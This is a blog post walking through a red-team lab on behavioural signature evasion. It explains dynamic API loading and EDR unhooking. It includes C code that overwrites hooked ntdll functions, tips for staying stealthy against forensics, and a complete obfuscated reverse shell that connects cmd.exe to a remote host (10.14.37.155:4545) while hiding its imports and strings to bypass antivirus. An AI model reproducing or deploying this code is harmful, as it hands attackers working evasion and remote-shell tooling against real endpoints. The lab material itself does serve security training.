---
layout: post
title: "Signature Evasion Part:2"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*yfVcLcbEp4ae7H72-2y-tg.jpeg
---

**Behavioral Signatures**

Obfuscating functions and properties can achieve a lot with minimal modification. Even after breaking static signatures attached to a file, modern engines may still **observe the behavior and functionality of the binary**. This presents numerous problems for attackers that cannot be solved with simple obfuscation.

Modern antivirus engines will employ two common methods to detect behavior: **observing imports and hooking known malicious calls**, while imports, as will he covered in this task, can be easily obfuscated or modified with minimal requirements, hooking requires complex techniques out of scope for this room. Because of the **prevalence of API calls specifically,** observing these functions can be a significant factor in determining if a file is suspicious, along with other behavioral tests/considerations.

Before diving too deep into rewriting or importing calls, let’s discuss how API calls are traditionally utilized and imported we will cover **C-based** languages first and then briefly cover .**NET**-based languages later in this task.

API calls and other functions native to an operating system require a **pointer** to a **function address and a structure** to utilize them.

Structures for functions are simple; they are located in **import libraries** such as **kernel32** or **ntdll** that store function structures and other core information for Windows.

The most **significant** **issue** to function Imports is the **function addresses**. Obtaining a **pointer May seem straightforward,** although because of **ASLR (Address Space Layout Randomization),** **function addresses are dynamic and must be found.**

Rather than altering code at runtime, the **Windows loader** **windows**.**h** is employed. At runtime, **the loader will map all modules to process address space and list all functions from each.** That handles the modules, but how addresses assigned!

One of the most critical functions of the Windows loader is the **IAT (Import Address Table).**

The **IAT** will **store function addresses for all imported function**s that can assign a pointer for the function.

The **IAT is stored in the PE (Portable Executable) header IMAGE\_OPTION\_HEADER** and is filled **by the Windows loader** at runtime. The Windows loader obtains the Function addresses or, more precisely, **thunks, from a pointer table**, accessed from an **API call or thunk table**.

At a glance, an **API** is assigned a **pointer** to a **thunk** as the **function address from the Windows loade**r. The import table can provide a lot of insight into the functionality of a binary that can be detrimental to an adversary. But how can we prevent our functions from appearing in the **IAT** if it is required to assign a function address?

As briefly mentioned, the thunk table is not the only way to obtain a pointer for a function address. We can utilize an API call to obtain the function address from the import library itself.

This technique is known as **dynamic loading** and can be used to **avoid the IAT** and minimize the use of the Windows loader.

We will write our structures and create new arbitrary names for functions to employ dynamic loading.

At a high level, we can break up dynamic loading in **C** languages into four steps:

1\. Define the **structure** of the call

2\. Obtain the **handle** of the module the call address is present in

3\. Obtain the **process** address of the call

4\. **Use** the newly created call

To begin dynamically loading an API call, we must first define a **structure** far before the call **before** the **main function.** The call structure will define any **inputs** or **outputs** that may be required for the call to function. We can find structures for a specific call in the Microsoft documentation. Because we are implementing this as a new call in C, the **syntax** must change a little, but the structure stays the same, as seen below.

> **Typedef BOOL (WINAPI* myNotGetComputerNameA){**

> **LPSTR lpBuffer,**

> **LPDOWRD nSize**

> **};**

To access the address of the API call, we must first load the library where it is defined. We will define this in the main function. This is commonly **kernel32.dll or ntdll.dll** for any Windows API calls. Below is an example of the syntax required to load a library into a module handle:

> **HMODULE hkernel32=LoadLibrary(“kernel32.dll”);**

Using the previously loaded module, we can obtain the process address for the specified API call. This will come directly after the **LoadLibrary**. We can store this call by **casting it along with the previously defined structure**. Below is an example of the syntax required to obtain the API call:

> **myNotGetComputerNameA notGetComputerNameA =(myNotGetComputerNameA) GetProcAddress(hkernel32,”GetComputerNameA”);**

Although this method solves many concerns and problems, there are still several considerations that must be noted. Firstly**, GetProcAddress and LoadLibraryA are still present in the IAT;** although not a direct indicator, it can lead to or reinforce **suspicion**; this problem can be solved using **PIC (Position Independent Code)**, Modern agents will also hock specific functions and monitor kernel interactions; this can be solved using **API unhooking.**

### How API Hooking Works

1\. **Hooking Basics**:

- Security tools inject their own logic into API functions by modifying the function’s prologue (initial bytes) with a jump instruction (`JMP`) to a custom monitoring function.
- For example, `NtCreateFile` might be hooked to log all file creation events.

2\. **Hook Implementation**:

- Original bytes in the function:

```
MOV EAX, system_call_number
```

```
INT 0x2E  ; Original system call
```

- Hooked version:

```
JMP EDRMonitoringFunction
```

When a process calls `NtCreateFile`, the hooked function redirects execution to the monitoring logic, which can inspect, log, or modify the call.

### Why API Unhooking?

API unhooking removes these hooks by restoring the original instructions, preventing the security tool from intercepting API calls. This allows malware to operate without being monitored.

### Steps for API Unhooking

1\. **Map a Clean Copy of the DLL**:

- Load a clean version of the hooked DLL (e.g., `ntdll.dll`) into the process memory using `LoadLibraryA` or by manually mapping it.
- This provides a reference to the unhooked API functions.

2\. **Identify Hooked APIs**:

- Compare the API functions in the current process memory with the clean version.
- Any differences indicate that the API is hooked.

3\. **Restore Original Bytes**:

- Copy the original instructions from the clean version and overwrite the hooked function in memory.

### API Unhooking Example: Restoring `NtCreateFile`

Here’s an example in C to unhook the `NtCreateFile` function:

```
#include <windows.h>
#include <stdio.h>
#include <string.h>
void UnhookAPI(const char* moduleName, const char* functionName) {
// Load a clean copy of the DLL
HMODULE hCleanModule = LoadLibraryA(moduleName);
if (!hCleanModule) {
printf("Failed to load clean DLL: %s\n", moduleName);
return;
}

// Get addresses of the hooked and clean function
void* hookedFunction = GetProcAddress(GetModuleHandleA(moduleName), functionName);
void* cleanFunction = GetProcAddress(hCleanModule, functionName);

if (!hookedFunction || !cleanFunction) {
printf("Failed to locate function: %s\n", functionName);
return;
}

// Restore the original bytes
DWORD oldProtect;
VirtualProtect(hookedFunction, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(hookedFunction, cleanFunction, 16);  // Copy first 16 bytes
VirtualProtect(hookedFunction, 16, oldProtect, &oldProtect);

printf("%s unhooked successfully.\n", functionName);
}

int main() {
UnhookAPI("ntdll.dll", "NtCreateFile");
return 0;
}
```

### API Unhooking in Assembly

API unhooking can also be done at a lower level using assembly to directly manipulate memory.

```
; Assume the clean DLL is mapped at 0x70000000
MOV RAX, [ntdll!NtCreateFile]   ; Address of the hooked API
MOV RCX, 0x70000000            ; Address of the clean DLL
ADD RCX, offset_to_NtCreateFile
MOV [RAX], [RCX]               ; Restore original bytes
```

### Practical Example: Unhooking `NtQueryInformationProcess`

Security tools often hook **NtQueryInformationProcess** to detect debugger presence.

1\. **Hooked Function**:

```
JMP EDRMonitoringLogic
```

2\. **Clean Function**:

```
MOV RAX, system_call_number
```

```
SYSCALL
```

3\. **Unhooking**:

- Load a clean version of `ntdll.dll`
- Compare the first 16 bytes of `NtQueryInformationProcess` in both versions.
- If different, overwrite the hooked function with the clean version.

### Advanced API Unhooking Techniques

1\. **Manual Syscall Invocation**:

- Instead of relying on API functions, directly invoke system calls using the **syscall** instruction.
- Example:

```
MOV R10, RCX
```

```
MOV EAX, system_call_number
```

```
SYSCALL
```

2\. **Hook Detection Tools**:

- Tools like [PE-Sieve](https://github.com/hasherezade/pe-sieve) or [Hollowshunter](https://github.com/hasherezade/hollows_hunter) can help identify hooked APIs.

3\. **Custom Manual Mapping**:

- Malware authors sometimes avoid using `LoadLibraryA` and instead manually map the DLL into memory, making the detection of the unhooking process itself more difficult.

### Considerations

· **Detection**:

- EDR tools may monitor attempts to load clean DLLs or manipulate API functions.
- Combining unhooking with other evasion techniques (e.g., PIC) can help avoid detection.

· **Stealth**:

- Restore hooks after execution to avoid suspicion during forensic analysis.
- Randomize unhooking behavior to prevent pattern-based detection.

### Conclusion

API unhooking is a critical evasion technique for malware to bypass security tools. By leveraging clean DLLs or directly invoking **syscalls**, attackers can effectively neutralize API hooks and carry out malicious actions undetected. However, advanced **EDRs** are constantly evolving to detect and mitigate such techniques, requiring attackers to employ increasingly sophisticated evasion strategies.

Using this knowledge you have accrued throughout this task, obfuscate the following C. snippet, ensuring no suspicious API calls are present in the IAT

![](https://cdn-images-1.medium.com/max/800/1*xCoCwHZHDgey4fYcbzGUWQ.png)

> **Obfuscated Code:**

> **#include &lt;windows.h&gt;**

> **#include &lt;stdio.h&gt;**

> **#include &lt;lm.h&gt;**

> **typedef BOOL (WINAPI* myNotGetComputerNameA)(**

> **LPSTR lpBuffer,**

> **LPDWORD nSize**

> **);**

> **int main() {**

> **HMODULE hkernel32 = LoadLibraryA(“kernel32.dll”);**

> **myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, “GetComputerNameA”);**

> }

**Putting It All Together**

As reiterated through both this article and [**Obfuscation Principles**](https://medium.com/@mezo512/obfuscation-principles-16b8affb5f74), no one method will be 100% effective or reliable.

To create a more effective and reliable methodology, we can combine several of the methods covered in this article and the previous.

When determining what order you want to begin obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class or is it easier to break a class that is obfuscated?

Note: In general, you should run automated obfuscation or less specific obfuscation methods after specific signature breaking; however, you will not need those techniques for this challenge.

Taking these notes into consideration, modify the provided binary to meet the specifications below:

**1. No suspicious library calls present**

**2. No leaked Function or variable names**

**3. The file hash is different than the original hash**

**4. Binary bypasses common antivirus engines**

**Note**: When considering library calls and leaked functions, be conscious of the IAT table and strings of your binary.

![](https://cdn-images-1.medium.com/max/800/1*1cGwQUmIqNDhg2rXUSTnoQ.png)

**Obfuscated Code:**

> **#include &lt;winsock2.h&gt;**

> **#include &lt;windows.h&gt;**

> **#include &lt;ws2tcpip.h&gt;**

> **#include &lt;stdio.h&gt;**

> **#define DEFAULT\_BUFLEN 1024**

> **typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);**

> **typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL\_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);**

> **typedef unsigned(WSAAPI* INET\_ADDR)(const char \*cp);**

> **typedef u\_short(WSAAPI* HTONS)(u\_short hostshort);**

> **typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr \*name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);**

> **typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);**

> **typedef int(WSAAPI* WSACLEANUP)(void);**

> **void runn(char* serv, int Port) {**

> **HMODULE hws2\_32 = LoadLibraryW(L”ws2\_32");**

> **WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2\_32, “WSAStartup”);**

> **WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2\_32, “WSASocketA”);**

> **INET\_ADDR myinet\_addr = (INET\_ADDR) GetProcAddress(hws2\_32, “inet\_addr”);**

> **HTONS myhtons = (HTONS) GetProcAddress(hws2\_32, “htons”);**

> **WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2\_32, “WSAConnect”);**

> **CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2\_32, “closesocket”);**

> **WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2\_32, “WSACleanup”);**

> **SOCKET S0;**

> **struct sockaddr\_in addr;**

> **WSADATA version;**

> **myWSAStartup(MAKEWORD(2,2), &amp;version);**

> **S0 = myWSASocketA(AF\_INET, SOCK\_STREAM, IPPROTO\_TCP, 0, 0, 0);**

> **addr.sin\_family = AF\_INET;**

> **addr.sin\_addr.s\_addr = myinet\_addr(serv);**

> **addr.sin\_port = myhtons(Port);**

> **if (myWSAConnect(S0, (SOCKADDR\*)&amp;addr, sizeof(addr), 0, 0, 0, 0)==SOCKET\_ERROR) {**

> **myclosesocket(S0);**

> **myWSACleanup();**

> **} else {**

> **char p1\[] = “cm”;**

> **char p2\[]=”d.exe”;**

> **char* p = strcat(p1,p2);**

> **STARTUPINFO sinfo;**

> **PROCESS\_INFORMATION pinfo;**

> **memset(&amp;sinfo, 0, sizeof(sinfo));**

> **sinfo.cb = sizeof(sinfo);**

> **sinfo.dwFlags = (STARTF\_USESTDHANDLES | STARTF\_USESHOWWINDOW);**

> **sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) S0;**

> **CreateProcess(NULL, p, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sinfo, &amp;pinfo);**

> **WaitForSingleObject(pinfo.hProcess, INFINITE);**

> **CloseHandle(pinfo.hProcess);**

> **CloseHandle(pinfo.hThread);**

> **}**

> **}**

> **int main(int argc, char \*\*argv) {**

> **if (argc == 3) {**

> **int port = atoi(argv\[2]);**

> **runn(argv\[1], port);**

> **}**

> **else {**

> **char host\[] = “10.14.37.155”;**

> **int port = 4545;**

> **runn(host, port);**

> **}**

> **return 0;**

> **}**

By [Moataz Osama](https://medium.com/@mezo512) on [January 25, 2025](https://medium.com/p/7349dfef6851).

[Canonical link](https://medium.com/@mezo512/signature-evasion-techniques-part-2-behavioral-signatures-7349dfef6851)

Exported from [Medium](https://medium.com) on August 26, 2025.